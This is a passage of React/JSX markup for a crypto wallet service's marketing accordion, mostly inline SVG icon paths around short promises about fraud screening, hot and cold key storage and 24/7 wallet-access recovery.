                                                  d="M17.5345 9.99838C17.5345 9.46114 17.9669 9.01562 18.5172 9.01562C19.0545 9.01562 19.5 9.46114 19.5 9.99838C19.5 10.5356 19.0545 10.9811 18.5172 10.9811C17.9669 10.9811 17.5345 10.5356 17.5345 9.99838ZM13.2759 9.99838C13.2759 9.46114 13.7083 9.01562 14.2586 9.01562C14.7959 9.01562 15.2414 9.46114 15.2414 9.99838C15.2414 10.5356 14.7959 10.9811 14.2586 10.9811C13.7083 10.9811 13.2759 10.5356 13.2759 9.99838ZM9.01724 9.99838C9.01724 9.46114 9.44966 9.01562 10 9.01562C10.5372 9.01562 10.9828 9.46114 10.9828 9.99838C10.9828 10.5356 10.5372 10.9811 10 10.9811C9.44966 10.9811 9.01724 10.5356 9.01724 9.99838ZM4.75862 9.99838C4.75862 9.46114 5.20414 9.01562 5.74138 9.01562C6.27862 9.01562 6.72414 9.46114 6.72414 9.99838C6.72414 10.5356 6.27862 10.9811 5.74138 10.9811C5.20414 10.9811 4.75862 10.5356 4.75862 9.99838ZM0.5 9.99838C0.5 9.46114 0.932414 9.01562 1.48276 9.01562C2.02 9.01562 2.46552 9.46114 2.46552 9.99838C2.46552 10.5356 2.02 10.9811 1.48276 10.9811C0.932414 10.9811 0.5 10.5356 0.5 9.99838Z"
                                                  fill="#6E737C"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2048_38666">
                                                  <rect
                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(0.5 0.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                          <span className="negative icon-minus">
                                            <svg
                                              width={20}
                                              height={2}
                                              viewBox="0 0 20 2"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <path
                                                d="M17.5345 0.998384C17.5345 0.461142 17.9669 0.015625 18.5172 0.015625C19.0545 0.015625 19.5 0.461142 19.5 0.998384C19.5 1.53562 19.0545 1.98114 18.5172 1.98114C17.9669 1.98114 17.5345 1.53562 17.5345 0.998384ZM13.2759 0.998384C13.2759 0.461142 13.7083 0.015625 14.2586 0.015625C14.7959 0.015625 15.2414 0.461142 15.2414 0.998384C15.2414 1.53562 14.7959 1.98114 14.2586 1.98114C13.7083 1.98114 13.2759 1.53562 13.2759 0.998384ZM9.01724 0.998384C9.01724 0.461142 9.44966 0.015625 10 0.015625C10.5372 0.015625 10.9828 0.461142 10.9828 0.998384C10.9828 1.53562 10.5372 1.98114 10 1.98114C9.44966 1.98114 9.01724 1.53562 9.01724 0.998384ZM4.75862 0.998384C4.75862 0.461142 5.20414 0.015625 5.74138 0.015625C6.27862 0.015625 6.72414 0.461142 6.72414 0.998384C6.72414 1.53562 6.27862 1.98114 5.74138 1.98114C5.20414 1.98114 4.75862 1.53562 4.75862 0.998384ZM0.5 0.998384C0.5 0.461142 0.932414 0.015625 1.48276 0.015625C2.02 0.015625 2.46552 0.461142 2.46552 0.998384C2.46552 1.53562 2.02 1.98114 1.48276 1.98114C0.932414 1.98114 0.5 1.53562 0.5 0.998384Z"
                                                fill="#3939EF"
                                              />
                                            </svg>
                                          </span>
                                        </div>
                                        <div className="accordion-body1">
                                          Our advanced fraud screening checks
                                          outbound transactions for malicious
                                          activity. To safeguard your accounts,
                                          and your customers’ accounts.{" "}
                                        </div>
                                      </div>
                                      <div className="accordion-item1">
                                        <div className="icon">
                                          <svg
                                            width={70}
                                            height={70}
                                            viewBox="0 0 70 70"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <path
                                              d="M15 2C15 3.10457 14.1046 4 13 4C11.8954 4 11 3.10457 11 2C11 0.895431 11.8954 0 13 0C14.1046 0 15 0.895431 15 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 13C4 14.1046 3.10457 15 2 15C0.895432 15 0 14.1046 0 13C0 11.8954 0.895432 11 2 11C3.10457 11 4 11.8954 4 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 24C4 25.1046 3.10457 26 2 26C0.895432 26 0 25.1046 0 24C0 22.8954 0.895432 22 2 22C3.10457 22 4 22.8954 4 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 35C4 36.1046 3.10457 37 2 37C0.895432 37 0 36.1046 0 35C0 33.8954 0.895432 33 2 33C3.10457 33 4 33.8954 4 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 46C4 47.1046 3.10457 48 2 48C0.895432 48 0 47.1046 0 46C0 44.8954 0.895432 44 2 44C3.10457 44 4 44.8954 4 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 57C4 58.1046 3.10457 59 2 59C0.895432 59 0 58.1046 0 57C0 55.8954 0.895432 55 2 55C3.10457 55 4 55.8954 4 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 68C15 69.1046 14.1046 70 13 70C11.8954 70 11 69.1046 11 68C11 66.8954 11.8954 66 13 66C14.1046 66 15 66.8954 15 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 35C37 36.1046 36.1046 37 35 37C33.8954 37 33 36.1046 33 35C33 33.8954 33.8954 33 35 33C36.1046 33 37 33.8954 37 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 2C59 3.10457 58.1046 4 57 4C55.8954 4 55 3.10457 55 2C55 0.895431 55.8954 0 57 0C58.1046 0 59 0.895431 59 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 68C59 69.1046 58.1046 70 57 70C55.8954 70 55 69.1046 55 68C55 66.8954 55.8954 66 57 66C58.1046 66 59 66.8954 59 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 13C70 14.1046 69.1046 15 68 15C66.8954 15 66 14.1046 66 13C66 11.8954 66.8954 11 68 11C69.1046 11 70 11.8954 70 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 57C70 58.1046 69.1046 59 68 59C66.8954 59 66 58.1046 66 57C66 55.8954 66.8954 55 68 55C69.1046 55 70 55.8954 70 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 24C70 25.1046 69.1046 26 68 26C66.8954 26 66 25.1046 66 24C66 22.8954 66.8954 22 68 22C69.1046 22 70 22.8954 70 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 35C70 36.1046 69.1046 37 68 37C66.8954 37 66 36.1046 66 35C66 33.8954 66.8954 33 68 33C69.1046 33 70 33.8954 70 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 46C70 47.1046 69.1046 48 68 48C66.8954 48 66 47.1046 66 46C66 44.8954 66.8954 44 68 44C69.1046 44 70 44.8954 70 46Z"
                                              fill="#6E737C"
                                            />
                                          </svg>
                                        </div>
                                        <div className="accordion-header1">
                                          <h5>We keep wallet keys secure</h5>
                                          <span className="positive icon-plus">
                                            <svg
                                              width={20}
                                              height={20}
                                              viewBox="0 0 20 20"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_2048_38666)">
                                                <path
                                                  d="M9.01562 18.5172C9.01562 17.98 9.44804 17.5345 9.99838 17.5345C10.5356 17.5345 10.9811 17.98 10.9811 18.5172C10.9811 19.0676 10.5356 19.5 9.99838 19.5C9.44804 19.5 9.01562 19.0676 9.01562 18.5172ZM9.01562 14.2586C9.01562 13.7214 9.44804 13.2759 9.99838 13.2759C10.5356 13.2759 10.9811 13.7214 10.9811 14.2586C10.9811 14.7959 10.5356 15.2414 9.99838 15.2414C9.44804 15.2414 9.01562 14.7959 9.01562 14.2586ZM9.01562 10C9.01562 9.46276 9.44804 9.01724 9.99838 9.01724C10.5356 9.01724 10.9811 9.46276 10.9811 10C10.9811 10.5372 10.5356 10.9828 9.99838 10.9828C9.44804 10.9828 9.01562 10.5372 9.01562 10ZM9.01562 5.74138C9.01562 5.20414 9.44804 4.75862 9.99838 4.75862C10.5356 4.75862 10.9811 5.20414 10.9811 5.74138C10.9811 6.27862 10.5356 6.72414 9.99838 6.72414C9.44804 6.72414 9.01562 6.27862 9.01562 5.74138ZM9.01562 1.48276C9.01562 0.945517 9.44804 0.5 9.99838 0.5C10.5356 0.5 10.9811 0.945517 10.9811 1.48276C10.9811 2.02 10.5356 2.46552 9.99838 2.46552C9.44804 2.46552 9.01562 2.02 9.01562 1.48276Z"
                                                  fill="#6E737C"
                                                />
                                                <path
                                                  d="M17.5345 9.99838C17.5345 9.46114 17.9669 9.01562 18.5172 9.01562C19.0545 9.01562 19.5 9.46114 19.5 9.99838C19.5 10.5356 19.0545 10.9811 18.5172 10.9811C17.9669 10.9811 17.5345 10.5356 17.5345 9.99838ZM13.2759 9.99838C13.2759 9.46114 13.7083 9.01562 14.2586 9.01562C14.7959 9.01562 15.2414 9.46114 15.2414 9.99838C15.2414 10.5356 14.7959 10.9811 14.2586 10.9811C13.7083 10.9811 13.2759 10.5356 13.2759 9.99838ZM9.01724 9.99838C9.01724 9.46114 9.44966 9.01562 10 9.01562C10.5372 9.01562 10.9828 9.46114 10.9828 9.99838C10.9828 10.5356 10.5372 10.9811 10 10.9811C9.44966 10.9811 9.01724 10.5356 9.01724 9.99838ZM4.75862 9.99838C4.75862 9.46114 5.20414 9.01562 5.74138 9.01562C6.27862 9.01562 6.72414 9.46114 6.72414 9.99838C6.72414 10.5356 6.27862 10.9811 5.74138 10.9811C5.20414 10.9811 4.75862 10.5356 4.75862 9.99838ZM0.5 9.99838C0.5 9.46114 0.932414 9.01562 1.48276 9.01562C2.02 9.01562 2.46552 9.46114 2.46552 9.99838C2.46552 10.5356 2.02 10.9811 1.48276 10.9811C0.932414 10.9811 0.5 10.5356 0.5 9.99838Z"
                                                  fill="#6E737C"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2048_38666">
                                                  <rect
                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(0.5 0.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                          <span className="negative icon-minus">
                                            <svg
                                              width={20}
                                              height={2}
                                              viewBox="0 0 20 2"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <path
                                                d="M17.5345 0.998384C17.5345 0.461142 17.9669 0.015625 18.5172 0.015625C19.0545 0.015625 19.5 0.461142 19.5 0.998384C19.5 1.53562 19.0545 1.98114 18.5172 1.98114C17.9669 1.98114 17.5345 1.53562 17.5345 0.998384ZM13.2759 0.998384C13.2759 0.461142 13.7083 0.015625 14.2586 0.015625C14.7959 0.015625 15.2414 0.461142 15.2414 0.998384C15.2414 1.53562 14.7959 1.98114 14.2586 1.98114C13.7083 1.98114 13.2759 1.53562 13.2759 0.998384ZM9.01724 0.998384C9.01724 0.461142 9.44966 0.015625 10 0.015625C10.5372 0.015625 10.9828 0.461142 10.9828 0.998384C10.9828 1.53562 10.5372 1.98114 10 1.98114C9.44966 1.98114 9.01724 1.53562 9.01724 0.998384ZM4.75862 0.998384C4.75862 0.461142 5.20414 0.015625 5.74138 0.015625C6.27862 0.015625 6.72414 0.461142 6.72414 0.998384C6.72414 1.53562 6.27862 1.98114 5.74138 1.98114C5.20414 1.98114 4.75862 1.53562 4.75862 0.998384ZM0.5 0.998384C0.5 0.461142 0.932414 0.015625 1.48276 0.015625C2.02 0.015625 2.46552 0.461142 2.46552 0.998384C2.46552 1.53562 2.02 1.98114 1.48276 1.98114C0.932414 1.98114 0.5 1.53562 0.5 0.998384Z"
                                                fill="#3939EF"
                                              />
                                            </svg>
                                          </span>
                                        </div>
                                        <div className="accordion-body1">
                                          We provide hot and cold storage
                                          solutions, so you can choose which
                                          suits you best. We can also help you
                                          decide which is right for you.{" "}
                                        </div>
                                      </div>
                                      <div className="accordion-item1">
                                        <div className="icon">
                                          <svg
                                            width={70}
                                            height={70}
                                            viewBox="0 0 70 70"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <path
                                              d="M15 2C15 3.10457 14.1046 4 13 4C11.8954 4 11 3.10457 11 2C11 0.895431 11.8954 0 13 0C14.1046 0 15 0.895431 15 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 13C15 14.1046 14.1046 15 13 15C11.8954 15 11 14.1046 11 13C11 11.8954 11.8954 11 13 11C14.1046 11 15 11.8954 15 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 57C15 58.1046 14.1046 59 13 59C11.8954 59 11 58.1046 11 57C11 55.8954 11.8954 55 13 55C14.1046 55 15 55.8954 15 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 68C15 69.1046 14.1046 70 13 70C11.8954 70 11 69.1046 11 68C11 66.8954 11.8954 66 13 66C14.1046 66 15 66.8954 15 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 13C4 14.1046 3.10457 15 2 15C0.895432 15 0 14.1046 0 13C0 11.8954 0.895432 11 2 11C3.10457 11 4 11.8954 4 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 57C4 58.1046 3.10457 59 2 59C0.895432 59 0 58.1046 0 57C0 55.8954 0.895432 55 2 55C3.10457 55 4 55.8954 4 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 2C59 3.10457 58.1046 4 57 4C55.8954 4 55 3.10457 55 2C55 0.895431 55.8954 0 57 0C58.1046 0 59 0.895431 59 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 13C59 14.1046 58.1046 15 57 15C55.8954 15 55 14.1046 55 13C55 11.8954 55.8954 11 57 11C58.1046 11 59 11.8954 59 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 57C59 58.1046 58.1046 59 57 59C55.8954 59 55 58.1046 55 57C55 55.8954 55.8954 55 57 55C58.1046 55 59 55.8954 59 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 68C59 69.1046 58.1046 70 57 70C55.8954 70 55 69.1046 55 68C55 66.8954 55.8954 66 57 66C58.1046 66 59 66.8954 59 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 13C70 14.1046 69.1046 15 68 15C66.8954 15 66 14.1046 66 13C66 11.8954 66.8954 11 68 11C69.1046 11 70 11.8954 70 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 57C70 58.1046 69.1046 59 68 59C66.8954 59 66 58.1046 66 57C66 55.8954 66.8954 55 68 55C69.1046 55 70 55.8954 70 57Z"
                                              fill="#6E737C"
                                            />
                                          </svg>
                                        </div>
                                        <div className="accordion-header1">
                                          <h5>
                                            We shape security around your needs
                                          </h5>
                                          <span className="positive icon-plus">
                                            <svg
                                              width={20}
                                              height={20}
                                              viewBox="0 0 20 20"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_2048_38666)">
                                                <path
                                                  d="M9.01562 18.5172C9.01562 17.98 9.44804 17.5345 9.99838 17.5345C10.5356 17.5345 10.9811 17.98 10.9811 18.5172C10.9811 19.0676 10.5356 19.5 9.99838 19.5C9.44804 19.5 9.01562 19.0676 9.01562 18.5172ZM9.01562 14.2586C9.01562 13.7214 9.44804 13.2759 9.99838 13.2759C10.5356 13.2759 10.9811 13.7214 10.9811 14.2586C10.9811 14.7959 10.5356 15.2414 9.99838 15.2414C9.44804 15.2414 9.01562 14.7959 9.01562 14.2586ZM9.01562 10C9.01562 9.46276 9.44804 9.01724 9.99838 9.01724C10.5356 9.01724 10.9811 9.46276 10.9811 10C10.9811 10.5372 10.5356 10.9828 9.99838 10.9828C9.44804 10.9828 9.01562 10.5372 9.01562 10ZM9.01562 5.74138C9.01562 5.20414 9.44804 4.75862 9.99838 4.75862C10.5356 4.75862 10.9811 5.20414 10.9811 5.74138C10.9811 6.27862 10.5356 6.72414 9.99838 6.72414C9.44804 6.72414 9.01562 6.27862 9.01562 5.74138ZM9.01562 1.48276C9.01562 0.945517 9.44804 0.5 9.99838 0.5C10.5356 0.5 10.9811 0.945517 10.9811 1.48276C10.9811 2.02 10.5356 2.46552 9.99838 2.46552C9.44804 2.46552 9.01562 2.02 9.01562 1.48276Z"
                                                  fill="#6E737C"
                                                />
                                                <path
                                                  d="M17.5345 9.99838C17.5345 9.46114 17.9669 9.01562 18.5172 9.01562C19.0545 9.01562 19.5 9.46114 19.5 9.99838C19.5 10.5356 19.0545 10.9811 18.5172 10.9811C17.9669 10.9811 17.5345 10.5356 17.5345 9.99838ZM13.2759 9.99838C13.2759 9.46114 13.7083 9.01562 14.2586 9.01562C14.7959 9.01562 15.2414 9.46114 15.2414 9.99838C15.2414 10.5356 14.7959 10.9811 14.2586 10.9811C13.7083 10.9811 13.2759 10.5356 13.2759 9.99838ZM9.01724 9.99838C9.01724 9.46114 9.44966 9.01562 10 9.01562C10.5372 9.01562 10.9828 9.46114 10.9828 9.99838C10.9828 10.5356 10.5372 10.9811 10 10.9811C9.44966 10.9811 9.01724 10.5356 9.01724 9.99838ZM4.75862 9.99838C4.75862 9.46114 5.20414 9.01562 5.74138 9.01562C6.27862 9.01562 6.72414 9.46114 6.72414 9.99838C6.72414 10.5356 6.27862 10.9811 5.74138 10.9811C5.20414 10.9811 4.75862 10.5356 4.75862 9.99838ZM0.5 9.99838C0.5 9.46114 0.932414 9.01562 1.48276 9.01562C2.02 9.01562 2.46552 9.46114 2.46552 9.99838C2.46552 10.5356 2.02 10.9811 1.48276 10.9811C0.932414 10.9811 0.5 10.5356 0.5 9.99838Z"
                                                  fill="#6E737C"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2048_38666">
                                                  <rect
                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(0.5 0.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                          <span className="negative icon-minus">
                                            <svg
                                              width={20}
                                              height={2}
                                              viewBox="0 0 20 2"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <path
                                                d="M17.5345 0.998384C17.5345 0.461142 17.9669 0.015625 18.5172 0.015625C19.0545 0.015625 19.5 0.461142 19.5 0.998384C19.5 1.53562 19.0545 1.98114 18.5172 1.98114C17.9669 1.98114 17.5345 1.53562 17.5345 0.998384ZM13.2759 0.998384C13.2759 0.461142 13.7083 0.015625 14.2586 0.015625C14.7959 0.015625 15.2414 0.461142 15.2414 0.998384C15.2414 1.53562 14.7959 1.98114 14.2586 1.98114C13.7083 1.98114 13.2759 1.53562 13.2759 0.998384ZM9.01724 0.998384C9.01724 0.461142 9.44966 0.015625 10 0.015625C10.5372 0.015625 10.9828 0.461142 10.9828 0.998384C10.9828 1.53562 10.5372 1.98114 10 1.98114C9.44966 1.98114 9.01724 1.53562 9.01724 0.998384ZM4.75862 0.998384C4.75862 0.461142 5.20414 0.015625 5.74138 0.015625C6.27862 0.015625 6.72414 0.461142 6.72414 0.998384C6.72414 1.53562 6.27862 1.98114 5.74138 1.98114C5.20414 1.98114 4.75862 1.53562 4.75862 0.998384ZM0.5 0.998384C0.5 0.461142 0.932414 0.015625 1.48276 0.015625C2.02 0.015625 2.46552 0.461142 2.46552 0.998384C2.46552 1.53562 2.02 1.98114 1.48276 1.98114C0.932414 1.98114 0.5 1.53562 0.5 0.998384Z"
                                                fill="#3939EF"
                                              />
                                            </svg>
                                          </span>
                                        </div>
                                        <div className="accordion-body1">
                                          We’ll work with you to choose the
                                          protection that fits your organisation
                                          – and your customers. We’ll stay by
                                          your side to help that protection flex
                                          as your needs evolve.
                                        </div>
                                      </div>
                                      <div className="accordion-item1">
                                        <div className="icon">
                                          <svg
                                            width={70}
                                            height={70}
                                            viewBox="0 0 70 70"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <path
                                              d="M15 13C15 14.1046 14.1046 15 13 15C11.8954 15 11 14.1046 11 13C11 11.8954 11.8954 11 13 11C14.1046 11 15 11.8954 15 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 35C15 36.1046 14.1046 37 13 37C11.8954 37 11 36.1046 11 35C11 33.8954 11.8954 33 13 33C14.1046 33 15 33.8954 15 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 57C15 58.1046 14.1046 59 13 59C11.8954 59 11 58.1046 11 57C11 55.8954 11.8954 55 13 55C14.1046 55 15 55.8954 15 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 35C4 36.1046 3.10457 37 2 37C0.895432 37 0 36.1046 0 35C0 33.8954 0.895432 33 2 33C3.10457 33 4 33.8954 4 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 24C26 25.1046 25.1046 26 24 26C22.8954 26 22 25.1046 22 24C22 22.8954 22.8954 22 24 22C25.1046 22 26 22.8954 26 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 35C26 36.1046 25.1046 37 24 37C22.8954 37 22 36.1046 22 35C22 33.8954 22.8954 33 24 33C25.1046 33 26 33.8954 26 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 46C26 47.1046 25.1046 48 24 48C22.8954 48 22 47.1046 22 46C22 44.8954 22.8954 44 24 44C25.1046 44 26 44.8954 26 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 2C37 3.10457 36.1046 4 35 4C33.8954 4 33 3.10457 33 2C33 0.895431 33.8954 0 35 0C36.1046 0 37 0.895431 37 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 13C37 14.1046 36.1046 15 35 15C33.8954 15 33 14.1046 33 13C33 11.8954 33.8954 11 35 11C36.1046 11 37 11.8954 37 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 24C37 25.1046 36.1046 26 35 26C33.8954 26 33 25.1046 33 24C33 22.8954 33.8954 22 35 22C36.1046 22 37 22.8954 37 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 35C37 36.1046 36.1046 37 35 37C33.8954 37 33 36.1046 33 35C33 33.8954 33.8954 33 35 33C36.1046 33 37 33.8954 37 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 46C37 47.1046 36.1046 48 35 48C33.8954 48 33 47.1046 33 46C33 44.8954 33.8954 44 35 44C36.1046 44 37 44.8954 37 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 57C37 58.1046 36.1046 59 35 59C33.8954 59 33 58.1046 33 57C33 55.8954 33.8954 55 35 55C36.1046 55 37 55.8954 37 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 68C37 69.1046 36.1046 70 35 70C33.8954 70 33 69.1046 33 68C33 66.8954 33.8954 66 35 66C36.1046 66 37 66.8954 37 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 24C48 25.1046 47.1046 26 46 26C44.8954 26 44 25.1046 44 24C44 22.8954 44.8954 22 46 22C47.1046 22 48 22.8954 48 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 35C48 36.1046 47.1046 37 46 37C44.8954 37 44 36.1046 44 35C44 33.8954 44.8954 33 46 33C47.1046 33 48 33.8954 48 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 46C48 47.1046 47.1046 48 46 48C44.8954 48 44 47.1046 44 46C44 44.8954 44.8954 44 46 44C47.1046 44 48 44.8954 48 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 13C59 14.1046 58.1046 15 57 15C55.8954 15 55 14.1046 55 13C55 11.8954 55.8954 11 57 11C58.1046 11 59 11.8954 59 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 35C59 36.1046 58.1046 37 57 37C55.8954 37 55 36.1046 55 35C55 33.8954 55.8954 33 57 33C58.1046 33 59 33.8954 59 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 57C59 58.1046 58.1046 59 57 59C55.8954 59 55 58.1046 55 57C55 55.8954 55.8954 55 57 55C58.1046 55 59 55.8954 59 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 35C70 36.1046 69.1046 37 68 37C66.8954 37 66 36.1046 66 35C66 33.8954 66.8954 33 68 33C69.1046 33 70 33.8954 70 35Z"
                                              fill="#6E737C"
                                            />
                                          </svg>
                                        </div>
                                        <div className="accordion-header1">
                                          <h5>
                                            We keep cool heads in a crisis
                                          </h5>
                                          <span className="positive icon-plus">
                                            <svg
                                              width={20}
                                              height={20}
                                              viewBox="0 0 20 20"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_2048_38666)">
                                                <path
                                                  d="M9.01562 18.5172C9.01562 17.98 9.44804 17.5345 9.99838 17.5345C10.5356 17.5345 10.9811 17.98 10.9811 18.5172C10.9811 19.0676 10.5356 19.5 9.99838 19.5C9.44804 19.5 9.01562 19.0676 9.01562 18.5172ZM9.01562 14.2586C9.01562 13.7214 9.44804 13.2759 9.99838 13.2759C10.5356 13.2759 10.9811 13.7214 10.9811 14.2586C10.9811 14.7959 10.5356 15.2414 9.99838 15.2414C9.44804 15.2414 9.01562 14.7959 9.01562 14.2586ZM9.01562 10C9.01562 9.46276 9.44804 9.01724 9.99838 9.01724C10.5356 9.01724 10.9811 9.46276 10.9811 10C10.9811 10.5372 10.5356 10.9828 9.99838 10.9828C9.44804 10.9828 9.01562 10.5372 9.01562 10ZM9.01562 5.74138C9.01562 5.20414 9.44804 4.75862 9.99838 4.75862C10.5356 4.75862 10.9811 5.20414 10.9811 5.74138C10.9811 6.27862 10.5356 6.72414 9.99838 6.72414C9.44804 6.72414 9.01562 6.27862 9.01562 5.74138ZM9.01562 1.48276C9.01562 0.945517 9.44804 0.5 9.99838 0.5C10.5356 0.5 10.9811 0.945517 10.9811 1.48276C10.9811 2.02 10.5356 2.46552 9.99838 2.46552C9.44804 2.46552 9.01562 2.02 9.01562 1.48276Z"
                                                  fill="#6E737C"
                                                />
                                                <path
                                                  d="M17.5345 9.99838C17.5345 9.46114 17.9669 9.01562 18.5172 9.01562C19.0545 9.01562 19.5 9.46114 19.5 9.99838C19.5 10.5356 19.0545 10.9811 18.5172 10.9811C17.9669 10.9811 17.5345 10.5356 17.5345 9.99838ZM13.2759 9.99838C13.2759 9.46114 13.7083 9.01562 14.2586 9.01562C14.7959 9.01562 15.2414 9.46114 15.2414 9.99838C15.2414 10.5356 14.7959 10.9811 14.2586 10.9811C13.7083 10.9811 13.2759 10.5356 13.2759 9.99838ZM9.01724 9.99838C9.01724 9.46114 9.44966 9.01562 10 9.01562C10.5372 9.01562 10.9828 9.46114 10.9828 9.99838C10.9828 10.5356 10.5372 10.9811 10 10.9811C9.44966 10.9811 9.01724 10.5356 9.01724 9.99838ZM4.75862 9.99838C4.75862 9.46114 5.20414 9.01562 5.74138 9.01562C6.27862 9.01562 6.72414 9.46114 6.72414 9.99838C6.72414 10.5356 6.27862 10.9811 5.74138 10.9811C5.20414 10.9811 4.75862 10.5356 4.75862 9.99838ZM0.5 9.99838C0.5 9.46114 0.932414 9.01562 1.48276 9.01562C2.02 9.01562 2.46552 9.46114 2.46552 9.99838C2.46552 10.5356 2.02 10.9811 1.48276 10.9811C0.932414 10.9811 0.5 10.5356 0.5 9.99838Z"
                                                  fill="#6E737C"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2048_38666">
                                                  <rect
                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(0.5 0.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                          <span className="negative icon-minus">
                                            <svg
                                              width={20}
                                              height={2}
                                              viewBox="0 0 20 2"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <path
                                                d="M17.5345 0.998384C17.5345 0.461142 17.9669 0.015625 18.5172 0.015625C19.0545 0.015625 19.5 0.461142 19.5 0.998384C19.5 1.53562 19.0545 1.98114 18.5172 1.98114C17.9669 1.98114 17.5345 1.53562 17.5345 0.998384ZM13.2759 0.998384C13.2759 0.461142 13.7083 0.015625 14.2586 0.015625C14.7959 0.015625 15.2414 0.461142 15.2414 0.998384C15.2414 1.53562 14.7959 1.98114 14.2586 1.98114C13.7083 1.98114 13.2759 1.53562 13.2759 0.998384ZM9.01724 0.998384C9.01724 0.461142 9.44966 0.015625 10 0.015625C10.5372 0.015625 10.9828 0.461142 10.9828 0.998384C10.9828 1.53562 10.5372 1.98114 10 1.98114C9.44966 1.98114 9.01724 1.53562 9.01724 0.998384ZM4.75862 0.998384C4.75862 0.461142 5.20414 0.015625 5.74138 0.015625C6.27862 0.015625 6.72414 0.461142 6.72414 0.998384C6.72414 1.53562 6.27862 1.98114 5.74138 1.98114C5.20414 1.98114 4.75862 1.53562 4.75862 0.998384ZM0.5 0.998384C0.5 0.461142 0.932414 0.015625 1.48276 0.015625C2.02 0.015625 2.46552 0.461142 2.46552 0.998384C2.46552 1.53562 2.02 1.98114 1.48276 1.98114C0.932414 1.98114 0.5 1.53562 0.5 0.998384Z"
                                                fill="#3939EF"
                                              />
                                            </svg>
                                          </span>
                                        </div>
                                        <div className="accordion-body1">
                                          We take the weight off your mind.
                                          We’re here 24/7 to restore your wallet
                                          access, and put you back in control.
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  <div className="custom_arrow arrowsFor_large">
                                    <div className="prev_arrow">
                                      <svg
                                        width={20}
                                        height={20}
                                        viewBox="0 0 20 20"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
